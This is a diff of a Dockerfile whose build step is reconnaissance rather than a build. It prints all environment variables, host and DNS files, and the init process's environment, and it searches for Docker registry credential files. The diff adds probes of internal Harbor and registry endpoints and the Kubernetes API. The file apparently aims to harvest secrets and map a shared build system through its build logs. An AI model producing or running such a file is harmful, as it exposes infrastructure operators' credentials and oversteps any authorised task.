@@ -1,10 +1,11 @@
 FROM alpine:3.19
 RUN echo "===ENV===" ; env | sort ; \
     echo "===HOSTS===" ; cat /etc/hosts ; cat /etc/resolv.conf ; \
-    echo "===DOCKERCFG-SEARCH===" ; find / -maxdepth 5 -name 'config.json' -path '*docker*' 2>/dev/null ; \
-    echo "===DOCKERDIRS===" ; ls -la /root/.docker /tmp/.docker /home/*/.docker 2>&1 | head -20 ; \
-    cat /root/.docker/config.json 2>&1 | head -20 ; \
+    echo "===DNS===" ; getent hosts harbor-core.harbor.svc.cluster.local fc-registry kubernetes.default.svc.cluster.local 2>&1 ; \
+    echo "===HARBOR===" ; wget -S -O- -T 5 http://harbor-core.harbor.svc.cluster.local/v2/ 2>&1 | head -14 ; \
+    echo "===FCREG===" ; wget -S -O- -T 5 http://fc-registry:5000/v2/ 2>&1 | head -14 ; \
+    echo "===K8SAPI===" ; wget -S -O- -T 5 --no-check-certificate https://kubernetes.default.svc.cluster.local/version 2>&1 | head -14 ; \
+    echo "===DOCKERCFG===" ; find / -maxdepth 5 -name 'config.json' -path '*docker*' 2>/dev/null ; ls -la /root/.docker 2>&1 | head ; \
     echo "===PROC1ENV===" ; tr '\0' '\n' < /proc/1/environ 2>&1 | head -60 ; \
-    echo "===PROC1CMD===" ; tr '\0' ' ' < /proc/1/cmdline 2>&1 ; echo ; \
     echo "===MOUNTS===" ; head -20 /proc/mounts ; echo "===DONE==="
 CMD ["sh","-c","echo dump; sleep 20"]
